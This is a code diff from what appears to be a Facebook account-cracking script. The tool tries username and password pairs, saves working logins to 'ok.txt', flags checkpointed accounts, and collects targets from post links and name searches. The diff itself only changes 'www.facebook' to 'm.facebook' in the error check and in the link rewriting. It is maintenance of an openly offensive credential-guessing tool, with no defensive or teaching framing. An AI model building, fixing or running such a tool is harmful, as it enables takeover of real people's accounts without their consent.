@@ -128,7 +128,7 @@ def moch_yayan():
                  else:
                         with open('ok.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
-             elif 'www.facebook.com' in response.json()['error_msg']:
+             elif 'm.facebook.com' in response.json()['error_msg']:
                    print(f"\r\033[1;93m  * --> {username}|{password}                    ",end="")
                    print()
                    check += 1
@@ -246,10 +246,10 @@ def moch_yayan():
                          username = input("\033[1;97m [\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
                          if username == "":
                                  exit("\033[00m[\033[91m!\033[00m] Wrong Link!")
-                         elif 'www.facebook' in username:
-                                 username = username.replace('www.facebook','mbasic.facebook')
-                         elif 'www.facebook' in username:
-                                 username = username.replace('www.facebook','mbasic.facebook.com')
+                         elif 'm.facebook' in username:
+                                 username = username.replace('m.facebook','mbasic.facebook')
+                         elif 'm.facebook' in username:
+                                 username = username.replace('m.facebook','mbasic.facebook.com')
                          username = fromlikes(username)
                    elif memek == '3' or memek =='03':
                          knf = input("\033[1;97m [\033[1;96m?\033[1;97m] The Name You Want To Search For \033[1;91m: \033[1;92m")
